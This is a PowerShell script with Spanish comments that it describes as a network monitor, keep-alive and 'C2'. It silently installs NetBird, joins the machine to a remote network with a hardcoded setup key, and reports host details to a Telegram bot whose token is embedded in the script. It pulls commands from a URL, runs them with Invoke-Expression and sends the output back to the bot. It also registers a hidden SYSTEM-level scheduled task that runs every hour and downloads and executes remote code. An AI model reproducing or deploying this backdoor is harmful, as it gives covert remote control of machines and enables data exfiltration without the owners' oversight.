# ===========================================================================
# SCRIPT DE RED CONTICS 2026 - MONITOR + KEEP ALIVE + C2 PRO
# ===========================================================================

# --- CONFIGURACION DE TELEGRAM ---
$TelegramToken = '8693420261:AAH0RQ-7LySZ03gglYDYOjJbY1xJonv_fak'
$TelegramChatID = '6902736310'

function Send-Telegram {
    param([string]$Message)
    try {
        $Url = "https://api.telegram.org/bot$($TelegramToken)/sendMessage"
        $Body = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = 'Markdown' }
        $Json = $Body | ConvertTo-Json -Compress
        $utf8 = [System.Text.Encoding]::UTF8.GetBytes($Json)
        Invoke-RestMethod -Uri $Url -Method Post -Body $utf8 -ContentType "application/json; charset=utf-8"
    } catch { }
}

# --- LOGICA DE RED ---
$mUrl = 'https://contics-admin.duckdns.org'
$sKey = '8552E0C2-4E0A-490D-8B93-E2CD69CDC007'
$nbPath = 'C:\Program Files\NetBird\netbird.exe'
$PCName = $env:COMPUTERNAME

# --- [PRO] RECEPTOR DE COMANDOS (C2) ---
# Usamos la variable $TareaUrl que ya tienes definida en tu script
try {
    $OrderRaw = (Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content
    if ($null -ne $OrderRaw) {
        $Order = $OrderRaw.Trim()
        if ($Order -ne "NONE" -and $Order -ne "") {
            Send-Telegram -Message "⚡ *EJECUTANDO ORDEN EN:* $PCName`n`n*Comando:* `$Order`"
            $Res = Invoke-Expression $Order 2>&1 | Out-String
            $ResFinal = if ($Res) { $Res } else { "Orden ejecutada." }
            Send-Telegram -Message "✅ *RESULTADO:*`n$ResFinal"
        }
    }
} catch { }

Write-Host "`n======================================================" -ForegroundColor Cyan
Write-Host "     SISTEMA DE RED CONTICS - OPTIMIZADO PRO" -ForegroundColor Cyan
Write-Host "======================================================`n" -ForegroundColor Cyan

# 1. Instalacion (Solo si no existe)
if (!(Test-Path $nbPath)) {
    Write-Host '[1/4] Instalando NetBird...' -ForegroundColor Yellow
    $installer = "$env:TEMP\nb.exe"
    Invoke-WebRequest -Uri 'https://github.com/netbirdio/netbird/releases/latest/download/netbird_installer_windows_amd64.exe' -OutFile $installer -UseBasicParsing
    Start-Process -FilePath $installer -ArgumentList '/S', '/component=service' -Wait
    Start-Sleep -Seconds 5
}

# 2. Conexion Inicial
Write-Host '[2/4] Vinculando equipo...' -ForegroundColor Yellow
& $nbPath down | Out-Null
& $nbPath up --management-url $mUrl --setup-key $sKey | Out-Null

# 3. Limpieza
if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }
Start-Sleep -Seconds 8 

# --- [PRO] OBTENER SALUD DEL SISTEMA ---
$Disk = Get-PSDrive C | Select-Object @{n='F';e={"{0:N2}" -f ($_.Free/1GB)}}
$RAM = Get-CimInstance Win32_OperatingSystem | Select-Object @{n='F';e={"{0:N2}" -f ($_.FreePhysicalMemory/1MB)}}

# 4. Reporte e IP con Telemetría
$status = & $nbPath status
$lineaIP = $status | Select-String 'NetBird IP:'
if ($lineaIP) {
    $nbIP = ($lineaIP.ToString() -split ':')[1].Trim()
    $nbIP = ($nbIP -split '/')[0].Trim() 
    $Msg = "*[OK] NODO CONTICS CONECTADO*`n`n*Equipo:* $PCName`n*IP:* $nbIP`n*Disco:* $($Disk.F) GB libres`n*RAM:* $($RAM.F) MB libres"
    Send-Telegram -Message $Msg
    Write-Host " [+] CONECTADO: $nbIP" -ForegroundColor Green
    $nbIP | clip
}

# 5. CONFIGURACION DE AUTO-RECONEXION + ACTUALIZACION (CADA 1 HORA)
Write-Host '[4/4] Configurando Tarea de Persistencia Actualizable...' -ForegroundColor Yellow
$TaskName = "Contics_KeepAlive"

# [PRO] Ahora la tarea no solo reconecta, sino que descarga tu ultima version de GitHub
$ActionScript = "powershell.exe -WindowStyle Hidden -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (iwr '$GitHubRawUrl' -UseBasicParsing)`""

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command `"$ActionScript`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null

# Ajuste de intervalo a 1 hora (PT1H)
$vTask = Get-ScheduledTask -TaskName $TaskName
$vTask.Triggers[0].Repetition.Interval = "PT1H" 
$vTask.Triggers[0].Repetition.Duration = "P365D"
Set-ScheduledTask -InputObject $vTask | Out-Null

Write-Host " ✅ Persistencia y C2 configurados correctamente." -ForegroundColor Green
Write-Host '------------------------------------------------------' -ForegroundColor Cyan
Start-Process $mUrl
Write-Host "`nTerminado."
Read-Host
